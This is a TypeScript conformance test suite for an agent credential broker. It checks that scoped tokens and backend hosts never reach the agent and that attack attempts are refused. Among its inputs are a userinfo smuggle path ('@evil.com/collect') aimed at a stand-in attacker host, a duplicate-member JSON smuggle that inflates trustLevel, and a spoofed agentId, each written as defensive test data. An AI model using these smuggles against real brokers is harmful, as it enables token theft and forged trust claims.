/**
 * AAP v1 conformance test — the artifact that proves the standard works (deliverable 3).
 *
 * It runs the REAL broker end to end over its Unix socket: an agent presents a grant
 * reference (`grant://orders-db`) and a logical operation, the broker verifies the ATX,
 * authorizes via local policy, mints a broker assertion, performs an RFC 8693 token
 * exchange (Okta adapter, fake transport), runs the operation in an ephemeral worker, and
 * returns ONLY the result.
 *
 * The invariant (AAP §4): the scoped downstream token and every backend identifier reach
 * the ephemeral worker but NEVER the agent context. This test asserts exactly that against
 * the bytes the agent actually sends and receives.
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import * as crypto from 'crypto';
import * as http from 'http';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';

import { BrokerServer } from './server';
import { GrantResolver } from './grant-resolver';
import {
  LocalAtxVerifier,
  canonicalPayload,
  canonicalPayloadV11,
  type Atx,
  type AtxTrustAnchors,
} from '@opena2a/atx-verify';
import { GrantPolicy, type GrantBinding } from './grant-policy';
import { MapProviderRegistry } from './cpi/registry';
import { createOktaExchangeProvider } from './cpi/okta-adapter';
import { generateBrokerSigningKey } from './cpi/assertion';
import { EphemeralWorker, type DownstreamCaller, type AgentOperation, type OperationResult } from './worker';
import { AuditLogger } from './audit';
import type { ScopedCredential } from './cpi/types';
import type { TokenExchangeRequest, TokenExchangeResponse, TokenExchangeTransport } from './cpi/exchange';

// AAP test fixtures. Previously shared from broker/atx.test.ts; that file was
// deleted when the verifier moved to @opena2a/atx-verify (which carries its own
// tests). This conformance test is the sole remaining consumer, so the fixtures
// live inline here. Confined to a *.test.ts file, so they never ship in dist.
const TEST_ISSUER = 'did:opena2a:authority:opena2a.org';
const TEST_CLOCK = new Date('2026-06-01T12:00:00Z');

function makeKeypair(): { privateKey: crypto.KeyObject; pubHex: string } {
  const { publicKey, privateKey } = crypto.generateKeyPairSync('ed25519');
  const jwk = publicKey.export({ format: 'jwk' }) as { x: string };
  const pubHex = Buffer.from(jwk.x, 'base64url').toString('hex');
  return { privateKey, pubHex };
}

/**
 * Build a valid, Ed25519-signed ATX (and the matching public key hex).
 *
 * The default is credential version 1.1, and that is load-bearing rather than incidental. The
 * v1.0 signature covers identity, issuer, trust level and validity window but NOT `capabilities`
 * or `scanSummary` — a holder edits those after signing and the credential still verifies. This
 * suite asserts that a grant is served to an agent matching `trustClass` and `oasbLevel`, so on
 * a v1.0 fixture it would have been asserting that the broker honours predicates the agent set
 * for itself. `GrantPolicy` now requires `signedCapabilities`, and this fixture supplies a
 * credential that actually carries them. Pass `atcVersion: '1.0'` to build the refused case.
 *
 * Pass `keypair` to sign with a key the server already trusts. Without it every call mints a
 * fresh key, so a fixture handed to a running broker is rejected at signature verification and
 * never reaches policy — which makes any assertion about a POLICY decision vacuous.
 */
function makeSignedAtx(
  overrides: Partial<Atx> = {},
  keypair?: { privateKey: crypto.KeyObject; pubHex: string },
): { atx: Atx; pubHex: string; keypair: { privateKey: crypto.KeyObject; pubHex: string } } {
  const kp = keypair ?? makeKeypair();
  const { privateKey, pubHex } = kp;
  const base: Atx = {
    atcVersion: '1.1',
    agentId: 'aim_orders_reader',
    agentDid: 'did:opena2a:agent:acme/orders-reader',
    version: '1.0.0',
    contentHash: 'sha256:abc123',
    buildAttestation: 'sha256:def456',
    issuerDid: TEST_ISSUER,
    issuerChain: [TEST_ISSUER],
    trustLevel: 4,
    trustScore: 0.95,
    issuedAt: '2026-05-25T00:00:00Z',
    expiresAt: '2026-06-08T00:00:00Z',
    capabilities: ['orders:read'],
    scanSummary: { oasbLevel: 'L2' },
    signatures: [],
    ...overrides,
  };
  const payload = base.atcVersion === '1.1' ? canonicalPayloadV11(base) : canonicalPayload(base);
  const sig = crypto.sign(null, payload, privateKey);
  base.signatures = [{ keyId: 'test#ed25519', algorithm: 'Ed25519', value: sig.toString('base64') }];
  return { atx: base, pubHex, keypair: kp };
}

function makeTrustAnchors(
  pubHex: string,
  extra: Partial<AtxTrustAnchors> = {},
): AtxTrustAnchors {
  return {
    trustedIssuers: [TEST_ISSUER],
    publicKeys: [{ algorithm: 'Ed25519', publicKeyHex: pubHex }],
    crl: { entries: [] },
    now: () => TEST_CLOCK,
    ...extra,
  };
}

// The two things that must never reach the agent context.
const SCOPED_TOKEN = 'SCOPED-DOWNSTREAM-TOKEN-must-not-leak';
const BACKEND_HOST = 'api.orders.internal';
const OKTA_ENDPOINT = 'https://acme.okta.com/oauth2/v1/token';

/** Fake authorization server (Okta) — returns the scoped token. */
class FakeIdp implements TokenExchangeTransport {
  last?: TokenExchangeRequest;
  async exchange(req: TokenExchangeRequest): Promise<TokenExchangeResponse> {
    this.last = req;
    return { access_token: SCOPED_TOKEN, token_type: 'Bearer', expires_in: 300 };
  }
}

/** Fake downstream "orders API" — records the token it saw, returns order rows. */
class FakeOrdersApi implements DownstreamCaller {
  sawAuthorization?: string;
  async call(audience: string, op: AgentOperation, cred: ScopedCredential): Promise<OperationResult> {
    this.sawAuthorization = `${cred.tokenType} ${cred.token}`;
    expect(audience).toContain(BACKEND_HOST); // the worker DID reach the real backend
    return { status: 200, body: { rows: [{ id: 1, customer: 'c-123', total: 42 }], path: op.path } };
  }
}

function brokerPost(
  socketPath: string,
  urlPath: string,
  token: string,
  body: unknown,
): Promise<{ status: number; text: string; json: any }> {
  return new Promise((resolve, reject) => {
    // A string body is sent verbatim (raw-wire tests: duplicate-member smuggles
    // must reach the broker byte-exact; JSON.stringify would collapse them).
    const data = typeof body === 'string' ? body : JSON.stringify(body);
    const req = http.request(
      {
        socketPath,
        path: urlPath,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(data),
          Authorization: `Bearer ${token}`,
        },
      },
      (res) => {
        const chunks: Buffer[] = [];
        res.on('data', (c: Buffer) => chunks.push(c));
        res.on('end', () => {
          const text = Buffer.concat(chunks).toString('utf-8');
          let json: unknown;
          try {
            json = JSON.parse(text);
          } catch {
            json = undefined;
          }
          resolve({ status: res.statusCode ?? 0, text, json });
        });
      },
    );
    req.on('error', reject);
    req.write(data);
    req.end();
  });
}

describe('AAP v1 conformance: no credential or backend identifier in the agent context', () => {
  let server: BrokerServer;
  let tmpDir: string;
  let socketPath: string;
  let auditPath: string;
  let tokenPath: string;
  let idp: FakeIdp;
  let ordersApi: FakeOrdersApi;
  let brokerToken: string;

  const ORDERS_BINDING: GrantBinding = {
    grant: 'grant://orders-db',
    match: { trustClass: 'orders:read', minTrustLevel: 3, oasbLevel: '>=L2' },
    resolve: {
      mode: 'exchange',
      providerId: 'orders-idp',
      scope: 'orders.read',
      audience: `https://${BACKEND_HOST}`,
      ttlSeconds: 300,
    },
  };

  beforeEach(async () => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'aap-conf-'));
    socketPath = path.join(tmpDir, 'broker.sock');
    auditPath = path.join(tmpDir, 'audit.log');
    // Isolated token file: never touch the machine-wide ~/.secretless-ai/broker.token,
    // which a real broker may own and which would otherwise race across test instances.
    tokenPath = path.join(tmpDir, 'broker.token');

    const { atx, pubHex, keypair } = makeSignedAtx();
    // Stash a valid ATX the "agent" will present. (In production the agent carries its own.)
    (globalThis as any).__aapTestAtx = atx;
    // And the key behind it, so a test can mint a DIFFERENT credential this same server trusts.
    (globalThis as any).__aapTestKeypair = keypair;

    const signingKey = generateBrokerSigningKey('https://broker.acme.example', 'broker-key-1');
    idp = new FakeIdp();
    ordersApi = new FakeOrdersApi();

    const providers = new MapProviderRegistry().register(
      'orders-idp',
      createOktaExchangeProvider({ orgUrl: 'https://acme.okta.com', signingKey, transport: idp }),
    );

    const grantResolver = new GrantResolver({
      verifier: new LocalAtxVerifier(makeTrustAnchors(pubHex)),
      policy: new GrantPolicy([ORDERS_BINDING]),
      providers,
      worker: new EphemeralWorker(ordersApi),
      audit: new AuditLogger(auditPath),
    });

    server = new BrokerServer(
      // policyFile is pinned into the test's own tmpdir. Omitted, PolicyEngine
      // falls back to ~/.secretless-ai/broker-policies.json, so this suite's
      // result depended on the machine's real policy file — it passed here
      // because that file happened to validate, and started failing the moment
      // policy validation got stricter. A conformance suite must not read
      // developer state.
      { socketPath, httpPort: 0, auditLog: auditPath, tokenFile: tokenPath, policyFile: path.join(tmpDir, 'broker-policies.json') },
      { aimClient: null, grantResolver },
    );
    await server.start();
    brokerToken = fs.readFileSync(tokenPath, 'utf-8');
  });

  afterEach(async () => {
    await server.stop();
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  it('returns only the operation result and leaks nothing into the agent context', async () => {
    const atx = (globalThis as any).__aapTestAtx;

    // What the agent emits: a grant reference + a logical operation. No secret, no host.
    const agentRequest = {
      agentId: 'aim_orders_reader',
      atx,
      grant: 'grant://orders-db',
      operation: { method: 'GET', path: '/orders', query: { customer: 'c-123' } },
    };

    const res = await brokerPost(socketPath, '/grant', brokerToken, agentRequest);

    // The agent gets the rows back.
    expect(res.status).toBe(200);
    expect(res.json.result.body.rows).toEqual([{ id: 1, customer: 'c-123', total: 42 }]);

    // The scoped token DID reach the ephemeral worker / downstream...
    expect(ordersApi.sawAuthorization).toBe(`Bearer ${SCOPED_TOKEN}`);
    // ...and the RFC 8693 exchange DID happen against the (configured) Okta endpoint.
    expect(idp.last?.tokenEndpoint).toBe(OKTA_ENDPOINT);

    // The minted broker assertion carries the abstract ATX trust class from the matched
    // policy clause, not the downstream scope (AAP-SPEC §4.2; end-to-end regression for
    // the scope/trust-class conflation).
    const subjectToken = idp.last?.params.subject_token ?? '';
    const assertionClaims = JSON.parse(
      Buffer.from(subjectToken.split('.')[1], 'base64url').toString('utf-8'),
    );
    expect(assertionClaims.trust_class).toBe('orders:read');
    expect(assertionClaims.scope).toBe('orders.read');

    // THE INVARIANT: the agent-visible surface (what it sent + what it received) contains
    // neither the credential nor any backend identifier.
    const agentVisible = JSON.stringify(agentRequest) + res.text;
    expect(agentVisible).not.toContain(SCOPED_TOKEN);       // no scoped token
    expect(agentVisible).not.toContain(BACKEND_HOST);       // no backend host
    expect(agentVisible).not.toContain('okta');             // no vendor name
    expect(agentVisible).not.toContain(OKTA_ENDPOINT);      // no IdP endpoint
    expect(agentVisible).not.toMatch(/eyJ[A-Za-z0-9_-]+\./); // no broker assertion JWT
    // The grant reference itself IS allowed in context.
    expect(agentVisible).toContain('grant://orders-db');
  });

  it('refuses a credential whose signature does not cover the predicates it is matched on', async () => {
    // The refusal path the v1.1 fixture would otherwise leave untested.
    //
    // Signed with the key THIS SERVER TRUSTS, and built honestly (orders:read, L2, trustLevel 4),
    // so it satisfies every predicate in ORDERS_BINDING. The only thing wrong with it is its
    // credential version. Using a fresh key here would have the server reject it at signature
    // verification, and the 403 would prove nothing about policy — the assertion would pass
    // against a build with no gate at all.
    const keypair = (globalThis as any).__aapTestKeypair;
    const { atx: v10Atx } = makeSignedAtx({ atcVersion: '1.0' }, keypair);

    // Discriminating control FIRST: this server does verify a v1.0 credential from this key, so
    // whatever the broker answers below is a policy decision and not a crypto rejection.
    const verified = new LocalAtxVerifier(makeTrustAnchors(keypair.pubHex)).verify(v10Atx);
    expect(verified.valid).toBe(true);
    expect(verified.context?.signedCapabilities).toBe(false);
    expect(verified.context?.capabilities).toContain('orders:read');
    expect(verified.context?.oasbLevel).toBe('L2');

    const denied = await brokerPost(socketPath, '/grant', brokerToken, {
      agentId: 'aim_orders_reader',
      atx: v10Atx,
      grant: 'grant://orders-db',
      operation: { method: 'GET', path: '/orders' },
    });
    expect(denied.status).toBe(403);
    // The denial stays opaque: it names neither the credential version nor the predicate.
    expect(denied.text).not.toMatch(/1\.0|signedCapabilities|oasbLevel|capabilit/i);

    // Second control: the SAME agent, the SAME key, the SAME claims, differing only in version,
    // is served. So the 403 is attributable to the version and to nothing else.
    const { atx: v11Atx } = makeSignedAtx({ atcVersion: '1.1' }, keypair);
    const allowed = await brokerPost(socketPath, '/grant', brokerToken, {
      agentId: 'aim_orders_reader',
      atx: v11Atx,
      grant: 'grant://orders-db',
      operation: { method: 'GET', path: '/orders' },
    });
    expect(allowed.status).toBe(200);
  });

  it('the signed audit log records the decision but never the scoped token', async () => {
    const atx = (globalThis as any).__aapTestAtx;
    await brokerPost(socketPath, '/grant', brokerToken, {
      agentId: 'aim_orders_reader',
      atx,
      grant: 'grant://orders-db',
      operation: { method: 'GET', path: '/orders' },
    });

    const audit = fs.readFileSync(auditPath, 'utf-8');
    expect(audit).toMatch(/"eventType":"grant"/);
    expect(audit).toMatch(/"result":"allowed"/);
    expect(audit).not.toContain(SCOPED_TOKEN);
  });

  it('returns a uniform opaque denial when policy denies (no detail leak)', async () => {
    // An ATX without the orders:read trust class.
    const { atx: weakAtx } = makeSignedAtx({ capabilities: ['weather:read'] });
    // Re-point trust anchors at this ATX's key by restarting with a matching verifier
    // is unnecessary: a different key would fail at verification, also yielding "denied".
    const res = await brokerPost(socketPath, '/grant', brokerToken, {
      agentId: 'aim_orders_reader',
      atx: weakAtx,
      grant: 'grant://orders-db',
      operation: { method: 'GET', path: '/orders' },
    });

    expect(res.status).toBe(403);
    expect(res.json).toEqual({ error: 'denied' }); // nothing about policy or backend
    expect(res.text).not.toContain('orders:read');
    expect(res.text).not.toContain(BACKEND_HOST);
  });

  it('audits the verified ATX identity, not the agent-supplied agentId', async () => {
    const atx = (globalThis as any).__aapTestAtx; // verified identity is "aim_orders_reader"

    await brokerPost(socketPath, '/grant', brokerToken, {
      agentId: 'attacker-claims-to-be-someone-else',
      atx,
      grant: 'grant://orders-db',
      operation: { method: 'GET', path: '/orders' },
    });

    const audit = fs.readFileSync(auditPath, 'utf-8');
    // The action is attributed to the cryptographically-verified ATX identity...
    expect(audit).toContain('aim_orders_reader');
    // ...never to the unverified value the caller supplied.
    expect(audit).not.toContain('attacker-claims-to-be-someone-else');
  });

  it('a crafted operation.path cannot exfiltrate the scoped token to another host', async () => {
    const atx = (globalThis as any).__aapTestAtx;

    // The agent tries to repoint the worker's request host via userinfo smuggling.
    const res = await brokerPost(socketPath, '/grant', brokerToken, {
      agentId: 'aim_orders_reader',
      atx,
      grant: 'grant://orders-db',
      operation: { method: 'GET', path: '@evil.com/collect' },
    });

    // Uniform opaque denial — and the downstream caller was never invoked with a leaked token.
    expect(res.status).toBe(403);
    expect(res.json).toEqual({ error: 'denied' });
    expect(ordersApi.sawAuthorization).toBeUndefined();
  });

  it('refuses a grant body carrying a duplicate-member smuggle inside the ATX', async () => {
    const atx = (globalThis as any).__aapTestAtx;
    const agentRequest = {
      agentId: 'aim_orders_reader',
      atx,
      grant: 'grant://orders-db',
      operation: { method: 'GET', path: '/orders', query: { customer: 'c-123' } },
    };
    // Inject a fold-colliding decoy BEFORE the signed trustLevel, byte-level:
    // JSON.parse is last-wins, so without the raw strict parse the broker would
    // see only the signed value and verify a credential whose bytes mean
    // something else to a case-insensitive first-wins consumer (the RFC 8259
    // §4 divergence the atx-conformance suite pins).
    const rawBody = JSON.stringify(agentRequest).replace('"trustLevel":', '"TRUSTLEVEL":9,"trustLevel":');
    expect(rawBody).toContain('"TRUSTLEVEL":9'); // the smuggle really is in the bytes

    const res = await brokerPost(socketPath, '/grant', brokerToken, rawBody);

    expect(res.status).toBe(400);
    // The scan reports the SECOND colliding name (the signed trustLevel; the
    // decoy TRUSTLEVEL came first) — same convention as the Go/Java verifiers.
    expect(res.json.error).toContain('Duplicate member "trustLevel"');
    // And the same request WITHOUT the smuggle still resolves, so the strict
    // parse is the only thing standing between the two outcomes.
    const clean = await brokerPost(socketPath, '/grant', brokerToken, agentRequest);
    expect(clean.status).toBe(200);
  });

  it('rejects an unauthenticated caller', async () => {
    const res = await brokerPost(socketPath, '/grant', 'wrong-token', {
      agentId: 'x',
      atx: {},
      grant: 'grant://orders-db',
      operation: { method: 'GET', path: '/' },
    });
    expect(res.status).toBe(401);
  });
});
